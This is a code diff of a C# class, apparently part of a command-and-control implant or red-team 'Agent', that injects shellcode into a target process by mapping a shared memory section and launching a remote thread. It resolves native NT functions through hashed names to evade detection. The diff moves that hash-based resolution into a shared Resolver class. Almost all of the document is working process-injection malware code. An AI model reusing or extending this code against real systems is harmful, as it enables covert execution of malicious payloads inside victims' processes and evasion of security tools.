@@ -9,45 +9,10 @@ namespace Agent
     internal class MapViewOfSection : ITechnique
     {
         int ITechnique.id => 2;
-        private long key = 0x617468656E61;
-        private Dictionary<string, string> map = new Dictionary<string, string>()
-        {
-            { "ncs", "F02C007B9EA8335BDD3ED4A0CCA00C19" },
-            { "nmvos", "40D0EA186AB9C28518E31DBF4149F653" },
-            { "rcut", "ACCEA385032CC00E5FA4B2A5EC57C8F3" },
-            { "ntd", "532FBE7D503E25FEDC8544721B744E16" }
-        };
-        private IntPtr ntdMod = IntPtr.Zero;
-        private IntPtr ncsFunc = IntPtr.Zero;
-        private IntPtr mvsFunc = IntPtr.Zero;
-        private IntPtr rcutFunc = IntPtr.Zero;
-        public bool resolved { get; set; } = false;
-
         private delegate uint nmpvosDelegate(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, ref ulong SectionOffset, ref ulong ViewSize, uint InheritDisposition, uint AllocationType, Native.MemoryProtection Win32Protect);
         private delegate uint ncsDelegate(ref IntPtr SectionHandle, Native.SectionAccess DesiredAccess, IntPtr ObjectAttributes, ref ulong MaximumSize, Native.MemoryProtection SectionPageProtection, Native.MappingAttributes AllocationAttributes, IntPtr FileHandle);
         private delegate IntPtr rcutDelegate(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, int stackZeroBits, IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, Native.CLIENT_ID clientId);
 
-        public bool Resolve()
-        {
-            resolved = false;
-            ntdMod = Generic.GetLoadedModulePtr(map["ntd"], key);
-            if (ntdMod == IntPtr.Zero)
-            {
-                resolved = false;
-                return false;
-            }
-
-            var ncsFunc = Generic.GetExportAddr(ntdMod, map["ncs"], key);
-            var mvsFunc = Generic.GetExportAddr(ntdMod, map["nmvos"], key);
-            var rcutFunc = Generic.GetExportAddr(ntdMod, map["rcut"], key);
-
-            if (rcutFunc != IntPtr.Zero && mvsFunc != IntPtr.Zero && ncsFunc != IntPtr.Zero)
-            {
-                resolved = true;
-            }
-
-            return resolved;
-        }
         public bool Inject(byte[] shellcode, IntPtr hTarget)
         {
             return Run(shellcode, hTarget);
@@ -60,7 +25,15 @@ namespace Agent
 
         private bool Run(byte[] shellcode, IntPtr htarget)
         {
-            if (!resolved)
+
+            List<string> resolveFuncs = new List<string>()
+            {
+                "nmvos",
+                "ncs",
+                "rcut"
+            };
+
+            if (!Resolver.ResolveFuncs(resolveFuncs, "ntd"))
             {
                 return false;
             }
@@ -71,7 +44,7 @@ namespace Agent
 
             // create a new section to map view to
             object[] ncsParams = new object[] { hSectionHandle, Native.SectionAccess.SECTION_ALL_ACCESS, IntPtr.Zero, size, Native.MemoryProtection.PAGE_EXECUTE_READWRITE, Native.MappingAttributes.SEC_COMMIT, IntPtr.Zero };
-            UInt32 result = Generic.InvokeFunc<UInt32>(ncsFunc, typeof(ncsDelegate), ref ncsParams);
+            UInt32 result = Generic.InvokeFunc<UInt32>(Resolver.GetFunc("ncs"), typeof(ncsDelegate), ref ncsParams);
 
             if (result != 0)
             {
@@ -87,7 +60,7 @@ namespace Agent
             size = (ulong)ncsParams[3];
 
             object[] nmvosParams = new object[] { hSectionHandle, (IntPtr)(-1), pLocalView, UIntPtr.Zero, UIntPtr.Zero, offset, size, ViewUnmap, (UInt32)0, Native.MemoryProtection.PAGE_READWRITE };
-            result = Generic.InvokeFunc<UInt32>(mvsFunc, typeof(nmpvosDelegate), ref nmvosParams);
+            result = Generic.InvokeFunc<UInt32>(Resolver.GetFunc("nmvos"), typeof(nmpvosDelegate), ref nmvosParams);
 
 
             if (result != 0)
@@ -106,7 +79,7 @@ namespace Agent
             IntPtr pRemoteView = IntPtr.Zero;
             
             object[] nmvosParams2 = new object[] { hSectionHandle, htarget, pRemoteView, UIntPtr.Zero, UIntPtr.Zero, offset, size, ViewUnmap, (UInt32)0, Native.MemoryProtection.PAGE_EXECUTE_READ };
-            result = Generic.InvokeFunc<UInt32>(mvsFunc, typeof(nmpvosDelegate), ref nmvosParams2);
+            result = Generic.InvokeFunc<UInt32>(Resolver.GetFunc("nmvos"), typeof(nmpvosDelegate), ref nmvosParams2);
 
             pRemoteView = (nint)nmvosParams2[2];
 
@@ -115,7 +88,7 @@ namespace Agent
             Native.CLIENT_ID cid = new Native.CLIENT_ID();
 
             object[] rcutParams = new object[] { htarget, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, pRemoteView, IntPtr.Zero, hThread, cid };
-            var res = Generic.InvokeFunc<nint>(rcutFunc, typeof(rcutDelegate), ref rcutParams);
+            var res = Generic.InvokeFunc<nint>(Resolver.GetFunc("rcut"), typeof(rcutDelegate), ref rcutParams);
 
             hThread = (nint)rcutParams[8];
             
